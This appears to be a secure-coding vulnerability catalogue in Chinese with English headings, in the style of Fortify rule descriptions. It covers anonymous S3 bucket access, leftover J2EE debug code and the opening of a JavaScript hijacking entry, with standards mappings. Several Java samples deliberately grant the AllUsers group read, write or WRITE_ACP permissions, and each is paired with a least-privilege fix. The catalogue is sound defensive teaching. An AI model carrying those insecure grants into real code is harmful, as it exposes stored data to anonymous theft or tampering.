<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">Grantee allusers = Grantee.builder().uri(&quot;http://acs.amazonaws.com/groups/global/AllUsers&quot;).build();</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;Read&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(allusers).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-20"><a href="#RECOMMENDATIONS-20" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终应用最小权限原则并授予程序所需的最小权限集。</p>
<p>示例 2：以下代码设置的Access Control Policy可基于用户的电子邮件地址授予对单个用户的读取访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">EmailAddressGrantee grantee = new EmailAddressGrantee(email);</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;Read&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(grantee).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-21"><a href="#REFERENCES-21" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 284, CWE ID 359 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.4.2 Access Control Architectural Requirements, 1.4.4 Access Control Architectural Requirements, 8.3.4 Sensitive Private Data, 10.2.1 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-S3-Write-ACP-Anonymous-Access"><a href="#Insecure-Storage-S3-Write-ACP-Anonymous-Access" class="headerlink" title="Insecure Storage: S3 Write ACP Anonymous Access"></a>Insecure Storage: S3 Write ACP Anonymous Access</h4><h5 id="ABSTRACT-22"><a href="#ABSTRACT-22" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序可授予匿名写入 AWS S3 存储桶或对象的访问控制策略 (ACP) 的权限。</p>
<h5 id="EXPLANATION-22"><a href="#EXPLANATION-22" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>授予匿名写入存储桶或对象的访问控制策略 (ACP) 的权限将允许攻击者在该存储桶中读取或写入任意内容。</p>
<p>示例 1：以下代码设置的Access Control Policy可授予对 foo 存储桶的匿名写入 ACP 访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">Grantee allusers = Grantee.builder().uri(&quot;http://acs.amazonaws.com/groups/global/AllUsers&quot;).build();</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;WRITE_ACP&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(allusers).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-21"><a href="#RECOMMENDATIONS-21" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终应用最小权限原则并授予程序所需的最小权限集。</p>
<p>示例 2：以下代码设置的Access Control Policy可基于用户的电子邮件地址授予对单个用户的访问控制策略 (ACP) 写入访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">EmailAddressGrantee grantee = new EmailAddressGrantee(email);</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;WRITE_ACP&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(grantee).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-22"><a href="#REFERENCES-22" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 284, CWE ID 359 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.4.2 Access Control Architectural Requirements, 1.4.4 Access Control Architectural Requirements, 8.3.4 Sensitive Private Data, 10.2.1 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Insecure-Storage-S3-Write-Anonymous-Access"><a href="#Insecure-Storage-S3-Write-Anonymous-Access" class="headerlink" title="Insecure Storage: S3 Write Anonymous Access"></a>Insecure Storage: S3 Write Anonymous Access</h4><h5 id="ABSTRACT-23"><a href="#ABSTRACT-23" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序可授予对 AWS S3 存储桶或对象的匿名写入访问权限。</p>
<h5 id="EXPLANATION-23"><a href="#EXPLANATION-23" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>授予对存储桶或对象的匿名写入访问权限将允许攻击者替换内容或上传恶意内容。</p>
<p>示例 1：以下代码设置的Access Control Policy可授予对 foo 存储桶的匿名写入访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">Grantee allusers = Grantee.builder().uri(&quot;http://acs.amazonaws.com/groups/global/AllUsers&quot;).build();</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;Write&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(allusers).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-22"><a href="#RECOMMENDATIONS-22" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终应用最小权限原则并授予程序所需的最小权限集。</p>
<p>示例 2：以下代码设置的Access Control Policy可基于用户的电子邮件地址授予对单个用户的写入访问权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GetBucketAclRequest bucketAclReq = GetBucketAclRequest.builder().bucket(&quot;foo&quot;).build();</span><br><span class="line"></span><br><span class="line">GetBucketAclResponse getAclRes = s3.getBucketAcl(bucketAclReq);</span><br><span class="line"></span><br><span class="line">List&lt;Grant&gt; grants = getAclRes.grants();</span><br><span class="line"></span><br><span class="line">EmailAddressGrantee grantee = new EmailAddressGrantee(email);</span><br><span class="line"></span><br><span class="line">Permission fc_permission = Permission.fromValue(&quot;Write&quot;);</span><br><span class="line"></span><br><span class="line">Grant grant = Grant.builder().grantee(grantee).permission(fc_permission).build();</span><br><span class="line"></span><br><span class="line">grants.add(grant);</span><br><span class="line"></span><br><span class="line">AccessControlPolicy acl = AccessControlPolicy.builder().grants(grants).build();</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-23"><a href="#REFERENCES-23" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 284, CWE ID 359 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002475 </p>
<p>[4] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[6] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.4.2 Access Control Architectural Requirements, 1.4.4 Access Control Architectural Requirements, 8.3.4 Sensitive Private Data, 10.2.1 Malicious Code Search </p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002340 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002340 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002340 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002340 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002340 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002340 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002340 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002340 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002340 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002340 CAT II </p>
<p>[37] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="J2EE-Bad-Practices-Leftover-Debug-Code"><a href="#J2EE-Bad-Practices-Leftover-Debug-Code" class="headerlink" title="J2EE Bad Practices: Leftover Debug Code"></a>J2EE Bad Practices: Leftover Debug Code</h4><h5 id="ABSTRACT-24"><a href="#ABSTRACT-24" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>调试代码可以在部署的 web 应用程序中建立一些意想不到的入口点。</p>
<h5 id="EXPLANATION-24"><a href="#EXPLANATION-24" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>开发过程中一般会为了调试和测试目的增加一些“后门”代码，这些代码不会随应用程序一起提供或部署。如果这类调试代码无意中被保留在应用程序中，则会导致应用程序向计划外的交互模式开放。这些后门入口点很容易产生安全隐患，因为它们不在当初的设计或者测试的考虑之内，并且不会出现在应用程序设计中的操作环境里。</p>
<p>遗忘调试代码中最常见例子出现在 web 应用程序中的 main() 方法。尽管这在产品的开发过程中是完全可以接受的，但是属于 J2EE 应用程序中的那部分类不应该定义 main()。</p>
<h5 id="RECOMMENDATIONS-23"><a href="#RECOMMENDATIONS-23" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>务必在部署应用程序的产品版之前删除调试代码。无论是否存在直接的安全威胁，一旦早期开发阶段结束，就没有任何理由将这样的代码保留在应用程序中。</p>
<h5 id="REFERENCES-24"><a href="#REFERENCES-24" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] ENV06-J. Production code must not contain debugging entry points CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 489</p>
<p>[3] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<h4 id="JavaScript-Hijacking"><a href="#JavaScript-Hijacking" class="headerlink" title="JavaScript Hijacking"></a>JavaScript Hijacking</h4><h5 id="ABSTRACT-25"><a href="#ABSTRACT-25" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 JavaScript 符号来传送敏感数据的应用程序可能会存在 JavaScript hijacking 的漏洞，该漏洞允许未经授权的攻击者从一个易受攻击的应用程序中读取机密数据。</p>
<h5 id="EXPLANATION-25"><a href="#EXPLANATION-25" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果发生以下情况，应用程序可能会很容易受到 JavaScript 劫持的攻击：1) 将 JavaScript 对象用作数据传输格式 2) 处理机密数据。由于 JavaScript 劫持漏洞不会作为编码错误的直接结果出现，所以 Fortify 安全编码规则包会通过识别在 HTTP 响应中产生的 JavaScript 代码，引起人们对潜在的 JavaScript 劫持漏洞的注意。</p>
<p>Web 浏览器执行同源策略 (Same Origin Policy)，以保护用户免受恶意网站的攻击。同源策略 (Same Origin Policy) 规定：如果要使用 JavaScript 来访问某个网页的内容的话，则 JavaScript 和网页必须都来源于相同的域。若不采取同源策略 (Same Origin Policy)，恶意网站便可以使用客户端凭证来运行从其他网站加载敏感信息的 JavaScript，并对这些信息进行提炼，然后将其返回给攻击者。通过 JavaScript 劫持，攻击者可以绕过 Web 应用程序中使用的同源策略 (Same Origin Policy)，该应用程序使用 JavaScript 来交流机密信息。同源策略 (Same Origin Policy) 中的漏洞是：通过这一策略，任何网站的 JavaScript 都可以被其他网站的上下文包含或执行。即使恶意网站不能直接在客户端上检查易受攻击的站点中加载的所有数据，但它仍可以通过配置一个特定的环境利用该漏洞。有了这样的环境，恶意网站就可以监视 JavaScript 的执行过程和任何可能发生的相关负面效应。由于许多 Web 2.0 应用程序使用 JavaScript 作为数据传输机制，因此，与传统的 Web 应用程序不同，它们往往很容易受到各种攻击。</p>
<p>JavaScript 中最常见的信息传输格式为 JavaScript Object Notation (JSON)。JSON RFC 将 JSON 语法定义为 JavaScript 类实例文本化定义语法 (object literal syntax)的子集。JSON 基于两种数据结构类型：阵列和对象。所有可以作为一个或多个有效 JavaScript 语句进行解析的数据传送格式都容易受到 JavaScript 劫持的攻击。JSON 使 JavaScript 劫持变得更加容易，因为 JSON 数组坚持认为它自己就是有效的 JavaScript 指令。因为数组是交换列表的一种正常形式，在应用程序需要交换多个值时会普遍使用该形式。换句话说，一个 JSON 数组会直接受到 JavaScript 劫持的攻击。一个 JSON 对象只在其被一些其他 JavaScript 结构包围时才会受到攻击，这些 JavaScript 结构坚持认为它们自己就是有效的 JavaScript 指令。</p>
<p>示例 1：在以下示例中，开头显示了一个在 Web 应用程序的客户端和服务器组件之间进行的合法 JSON 交互，这一 Web 应用程序用于管理潜在商机。接下来，它说明了攻击者如何模仿客户端获取服务器端返回的机密信息。注意，本例子是专为基于 Mozilla 的浏览器而编写的代码。若在创建对象时，没有使用 new 运算符，则其他主流浏览器会禁止重载默认构造函数。</p>
<p>客户端向服务器请求数据，并通过以下代码评估 JSON 结果：</p>
